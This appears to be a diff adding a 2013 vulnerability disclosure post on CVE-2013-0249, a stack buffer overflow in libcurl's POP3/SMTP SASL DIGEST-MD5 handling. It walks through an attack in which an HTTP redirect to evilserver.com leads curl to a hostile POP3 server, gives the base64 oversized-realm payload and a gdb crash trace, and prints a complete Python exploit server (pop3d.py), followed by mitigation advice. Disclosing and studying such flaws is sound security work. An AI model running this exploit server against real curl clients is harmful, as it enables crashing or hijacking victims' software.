@@ -1,0 +1,105 @@
+cURL buffer overflow
+Wed 06 February 2013
+
+Volema found remotely exploitable buffer overflow vulnerability in libcurl POP3, SMTP protocol handlers which lead to code execution (RCE). When negotiating SASL DIGEST-MD5 authentication, the function Curl_sasl_create_digest_md5_message() uses the data provided from the server without doing the proper length checks and that data is then appended to a local fixed-size buffer on the stack.
+
+Vendor notified, CVE-2013-0249 relased.
+
+Attack Concept Outline
+
+We have the permissions to send custom HTTP requests with curl. We send request to our http://evilserver.com/
+
+GET / HTTP/1.0
+Host: evilserver.com
+
+server answers with
+
+HTTP/1.0 302 Found
+Location: pop3://x:x@evilserver.com/.
+
+"smart" curl interpretes redirect and connects to evilserver.com port 110/TCP using POP3 proto. Server answers
+
++OK POP3 server ready
+
+curl sends
+
+CAPA
+
+servers answers with DIGEST-MD5 only
+
++OK List of capabilities follows
+SASL DIGEST-MD5
+IMPLEMENTATION dumbydumb POP3 server
+
+so, libcurl has to send
+
+AUTH DIGEST-MD5
+
+then server sends the payload
+
++ cmVhbG09IkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIixub25jZT0iT0E2TUc5dEVRR20yaGgiLHFvcD0iYXV0aCIsYWxnb3JpdGhtPW1kNS1zZXNzLGNoYXJzZXQ9dXRmLTg=
+
+and overflow happens because of fixed realm buffer size
+
+realm="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",nonce="OA6MG9tEQGm2hh",qop="auth",algorithm=md5-sess,charset=utf-8
+
+how it looks in gdb
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007fd2b238298d in ?? () from /lib/x86_64-linux-gnu/libc.so.6
+(gdb) bt
+#0  0x00007fd2b238298d in ?? () from /lib/x86_64-linux-gnu/libc.so.6
+#1  0x00007fd2b2a5cc07 in Curl_sasl_create_digest_md5_message ()
+   from /home/kyprizel/test/curl-7.28.1/lib/.libs/libcurl.so.4
+#2  0x4141414141414141 in ?? ()
+...
+#1469 0x4141414141414141 in ?? ()
+#1470 0x656d616e72657375 in ?? ()
+Cannot access memory at address 0x7fff63b8b000
+
+Original exploit: pop3d.py.
+
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# curl pop3 CVE-2013-0249 by Volema/MSLC
+
+import socket
+import base64
+
+host = "localhost"
+port = 110
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((host, port))
+s.listen(5)
+sock, addr = s.accept()
+sock.send('+OK POP3 server ready\n')
+while True:
+    buf = sock.recv(1024)
+    print buf
+    if buf.find('USER') > -1:
+        sock.send('+OK\n')
+    if buf.find('PASS') > -1:
+        sock.send('-ERR 999\n')
+    if buf.find('CAPA') > -1:
+        resp =  '+OK List of capabilities follows\n'
+        resp += 'SASL DIGEST-MD5\n'
+        resp += 'IMPLEMENTATION dumbydumb POP3 server\n'
+        resp += '.\n'
+        sock.send(resp)
+    if buf.find('QUIT') > -1:
+        sock.send('+OK')
+        break
+    if buf.find('AUTH') > -1:
+        realm = 'A'*128
+        payload = 'realm="%s",nonce="OA6MG9tEQGm2hh",qop="auth",algorithm=md5-sess,charset=utf-8' % realm
+        resp = '+ '+base64.b64encode(payload)+'\n'
+        print resp
+        sock.send(resp)
+sock.close()
+
+
+Mitigation
+
+We recommend to disable protocols other than HTTP(S) in your application using options CURLOPT_PROTOCOLS and CURLOPT_REDIR_PROTOCOLS. libcurl version should be updated.
